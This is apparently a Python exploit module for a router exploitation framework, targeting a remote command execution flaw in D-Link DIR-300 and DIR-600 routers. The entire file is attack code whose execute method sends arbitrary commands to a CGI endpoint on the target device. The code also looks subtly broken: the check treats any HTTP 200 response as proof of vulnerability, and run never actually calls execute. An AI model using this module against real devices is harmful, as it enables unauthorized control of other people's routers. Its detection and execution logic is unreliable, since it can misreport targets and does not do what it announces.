# rsf exploit module
# description: Module exploits Remote Code Execution vulnerability in D-Link DIR-300, DIR-600 devices.

import requests

class Exploit:
    __info__ = {
        "name": "D-Link DIR-300 & DIR-600 RCE",
        "description": "Module exploits Remote Code Execution vulnerability in D-Link DIR-300, DIR-600 devices.",
        "authors": (
            "Craig Heffner",  # vulnerability discovery
        ),
        "references": (
            "http://www.devttys0.com/2010/12/dlink-php-vulnerability/",
        ),
        "devices": (
            "D-Link DIR-300",
            "D-Link DIR-600",
        )
    }

    def __init__(self, target):
        self.target = target
        self.port = 80

    def run(self):
        if self.check():
            print("Target is vulnerable")
            print("Attempting remote command execution...")
        else:
            print("Exploit failed - target seems to be not vulnerable")

    def execute(self, command):
        data = {
            "command": command,
            "submit": "Execute"
        }
        response = requests.post(f"{self.target}/tools_adv_cgi.cgi", data=data)
        if response.status_code == 200:
            print(f"Command executed successfully: {command}")
        else:
            print("Failed to execute command.")

    def check(self):
        response = requests.get(f"{self.target}/tools_adv_cgi.cgi")
        if response.status_code == 200:
            return True
        return False

